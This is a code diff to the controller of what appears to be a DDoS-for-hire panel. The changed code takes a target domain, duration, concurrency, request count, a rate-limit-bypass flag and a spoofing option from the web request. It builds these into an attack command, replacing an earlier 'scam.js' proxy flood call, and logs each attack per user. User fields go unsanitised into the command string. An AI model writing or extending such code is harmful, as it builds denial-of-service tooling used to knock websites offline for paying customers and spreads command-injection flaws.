@@ -141,10 +141,15 @@ class AttackController:
             }), 400
 
         socketId = data.get('sid', '')
-        domainName = data.get('domain', '')
-        timeValue = data.get('time', '60')
-        concurrentValue = data.get('concurrents', '10')
-        requestCount = data.get('requests', '100')
+        domainName = data.get('domain')
+        attackTimeValue = data.get('attack_time')
+        bypassRateLimitValue = str(data.get('bypass_ratelimit')).lower()
+        coreStrengthValue = data.get('core_strength')
+        modeValue = data.get('mode')
+        concurrentValue = data.get('concurrents')
+        requestCount = data.get('request')
+        spoofCount = data.get('spoof')
+        typeAttack = data.get('typeAttack')
         
         # Check blacklisted domains
         for blacklisted in BLACKLISTED_DOMAINS:
@@ -156,8 +161,6 @@ class AttackController:
                     "status": "error",
                     "message": f"Your attack on {domainName} has been blocked"
                 }), 400
-
-      
 
         # Get headers from request headers
         headers = dict(request.headers)
@@ -192,19 +195,26 @@ class AttackController:
                 return jsonify({
                     "status": "error",
                     "message": "No valid servers found in the request"
-                }), 400
+                }), 400 
 
-        attackCommand = f"scam.js {domainName} {timeValue} {concurrentValue} {requestCount} proxy.txt --debug true --auth true"
-        # Create attack log entry
+        if spoofCount is not None:
+            attackCommand = f"{modeValue} {domainName} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} --debug true --auth true --ratelimit {bypassRateLimitValue} --spoof {str(data.get('spoof')).lower()}"
+        else:
+            attackCommand = f"{modeValue} {domainName} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} --debug true --auth true --ratelimit {bypassRateLimitValue}"
+
+        print(attackCommand)
+            
+        # Create attack log entryJ
         attackLog = AttackLog(
             userId=currentUser['id'],
             domainName=domainName,
-            time=int(timeValue),
+            time=int(attackTimeValue),
             concurrent=int(concurrentValue),
             request=int(requestCount),
             command=attackCommand,
             headers=json.dumps(headers) if headers else None
         )
+        print(attackCommand)
         db.session.add(attackLog)
         db.session.commit()
 
